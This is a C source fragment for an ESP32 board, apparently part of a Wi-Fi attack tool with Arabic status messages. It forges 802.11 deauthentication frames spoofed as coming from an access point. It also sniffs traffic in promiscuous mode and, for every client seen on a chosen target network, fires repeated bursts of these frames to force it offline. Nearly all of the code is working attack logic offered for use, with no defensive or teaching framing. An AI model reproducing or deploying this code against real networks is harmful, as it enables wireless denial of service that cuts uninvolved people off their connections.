void send_deauth_frame(uint8_t* client_mac, uint8_t* ap_mac, uint8_t* bssid, int reason) {
    deauth_frame_t deauth_frame;

    deauth_frame.frame_control[0] = 0xC0;
    deauth_frame.frame_control[1] = 0x00;
    deauth_frame.duration[0] = 0x00;
    deauth_frame.duration[1] = 0x00;

    memcpy(deauth_frame.station, client_mac, 6);
    memcpy(deauth_frame.sender, ap_mac, 6);
    memcpy(deauth_frame.access_point, bssid, 6);

    deauth_frame.fragment_sequence[0] = 0xF0;
    deauth_frame.fragment_sequence[1] = 0xFF;
    deauth_frame.reason = reason;

    esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
}

IRAM_ATTR void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!deauth_running) return;

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* data = pkt->payload;

    if ((data[0] == 0x08 || data[0] == 0x88) && (data[0] & 0x0C) == 0x08) {
        uint8_t* src = &data[10];
        uint8_t* bssid = &data[16];

        if (target_network_index >= 0 && target_network_index < networks.size()) {
            uint8_t* target_bssid = networks[target_network_index].bssid;
            if (memcmp(bssid, target_bssid, 6) == 0) {
                for (int i = 0; i < 16; i++) {
                    send_deauth_frame(src, bssid, bssid, 1);
                    delay(1);
                }
                deauth_stations++;
                Serial.printf("📤 Deauth sent to %02X:%02X:%02X:%02X:%02X:%02X\n",
                            src[0], src[1], src[2], src[3], src[4], src[5]);
            }
        }
    }
}

void start_deauth(int network_index) {
    if (network_index < 0 || network_index >= networks.size()) {
        Serial.println("❌ رقم شبكة غير صحيح");
        return;
    }

    target_network_index = network_index;
    deauth_running = true;
    deauth_stations = 0;

    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(sniffer_callback);

    Serial.printf("🎯 بدء Deauth على الشبكة %d: %s\n", 
                 network_index, networks[network_index].ssid.c_str());
}

